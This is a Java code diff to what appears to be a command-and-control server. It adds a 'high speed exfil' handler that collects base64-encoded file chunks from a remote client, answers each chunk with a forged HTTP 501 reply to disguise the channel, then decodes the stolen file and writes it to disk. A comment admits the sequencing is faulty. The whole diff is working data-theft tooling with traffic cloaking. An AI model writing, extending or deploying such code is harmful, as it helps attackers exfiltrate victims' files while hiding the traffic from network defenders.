@@ -1,10 +1,16 @@
 package networking;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Base64;
+import java.util.Date;
 import java.util.List;
 import java.util.Scanner;
+import java.util.TimeZone;
 
 import commandline.LocalCommandInterpreter;
 
@@ -36,6 +42,8 @@ public class CommandServer implements Runnable{
 					}
 					else if(command.startsWith("gimme")){
 						sendAll(connection,command);
+					}else if(command.startsWith("speedyboi")){
+						handleHighSpeedExfil(command, connection);
 					}
 					else if(ci.checkCommand(command)) {
 						ci.runCommand(command);
@@ -58,7 +66,18 @@ public class CommandServer implements Runnable{
 		}
 		
 	}
-	@SuppressWarnings("unused")
+	private void sendAll(Socket s, String clientHello, boolean skipLast) throws IOException {
+		ArrayList<String> allPacks = this.encodeResponse(clientHello);
+		allPacks.add(new String(new char[] {0,0,0}));
+		for(String pack : allPacks){
+			s.getOutputStream().write(pack.getBytes());
+			s.getOutputStream().flush();
+			if(!skipLast && pack.charAt(0)!=0 && pack.charAt(1)!=0 && pack.charAt(2)!=0){
+				readAll(s);
+			}
+		}
+		
+	}
 	private String readAll(Socket socket) throws IOException {
 		int c;
 	    String raw = "";
@@ -84,6 +103,47 @@ public class CommandServer implements Runnable{
 		
 		return output;
 	}
+	private void handleHighSpeedExfil(String command, Socket socket) throws IOException{ //Sequencing is wrong, probably has something to do with the HTTP cloaking
+		Date currentTime = new Date();
+	    SimpleDateFormat sdf = new SimpleDateFormat("EEE, d MMM yyyy HH:mm:ss z");
+	    sdf.setTimeZone(TimeZone.getTimeZone("GMT"));
+	    String sendDate = sdf.format(currentTime);
+	    byte[] highSpeedResponse = ("HTTP/1.1 501\r\nServer: ECS (dcb/7EEA)\r\nDate: "+sendDate+"\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>Method Not Implemented</h1>").getBytes();
+		System.out.print("\n[?] Confirm high speed send? (y/n)>");
+		if(stdin.nextLine().toUpperCase().indexOf("Y")==-1){
+			System.out.println("Cancelled high speed send!");
+			return;
+		}
+		System.out.println("[.] Starting high speed send");
+		sendAll(socket, command, true);
+		String totalB64 = "";
+		System.out.println("[.] Awaiting Response...");
+		String respText = readAll(socket);
+		while(respText.indexOf("%%%")==-1){
+			System.out.println("[!] Response Recieved!");
+			int startIndex = respText.indexOf("/");
+			int endIndex = respText.indexOf("%");
+			String b64Data = respText.substring(startIndex, endIndex);
+			totalB64+=b64Data;
+			socket.getOutputStream().write(highSpeedResponse);
+			socket.getOutputStream().flush();
+			respText = readAll(socket);
+		}
+		int startIndex = respText.indexOf("/");
+		int endIndex = respText.indexOf("%");
+		String b64Data = respText.substring(startIndex, endIndex);
+		totalB64+=b64Data;
+		endIndex=totalB64.indexOf('*');
+		totalB64=totalB64.substring(0, endIndex);
+		byte[] fileBytes = Base64.getDecoder().decode(totalB64.getBytes());
+		System.out.println("[!] Exfil complete!");
+		System.out.print("Enter File Name: ");
+		String fileName = stdin.nextLine();
+		FileOutputStream fos = new FileOutputStream(new File(fileName));
+		fos.write(fileBytes);
+		System.out.println("[!] Write Complete!");
+	}
+	
 	private ArrayList<String> encodeResponse(String message){
 		ArrayList<String> temp = new ArrayList<String>();
 		List<String> inputChunks = NetUtil.getParts(message, 3);
